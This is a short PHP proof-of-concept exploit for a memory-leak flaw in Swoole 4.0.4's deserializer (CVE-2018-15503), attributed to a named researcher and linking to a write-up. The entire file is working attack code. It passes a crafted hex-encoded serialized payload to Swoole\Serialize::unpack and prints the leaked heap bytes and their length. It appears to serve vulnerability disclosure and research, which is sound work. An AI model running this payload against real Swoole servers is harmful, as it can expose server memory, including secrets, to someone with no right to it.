
<?php
//Memory Leak Swoole 4.0.4 (more info in https://x-c3ll.github.io/posts/swoole-deserialization-cve-2018-15503/)
//Author: Juan Manuel Fernandez (@TheXC3LL)

// This PoC leaks 0xff bytes of memory


	$data = "e802ea7b02ea7b02227b0a010800737464436c617373018b0470726f7037ff0a010800737464436c617373018fc10037130a010800737464436c617373018ff1003713454f46";
	$obj = new \Swoole\Serialize();
	$sor = hex2bin($data);
	$ser = $obj->unpack($sor);
	echo "[+] Swoole Unserialized:\n";
	var_dump($ser);
	echo "[+] Memory Leaked:\n";
	$keys = key(get_object_vars($ser[1]));
	echo bin2hex($keys);
	echo "\n[+] Size: \n";
	echo strlen($keys);
?>
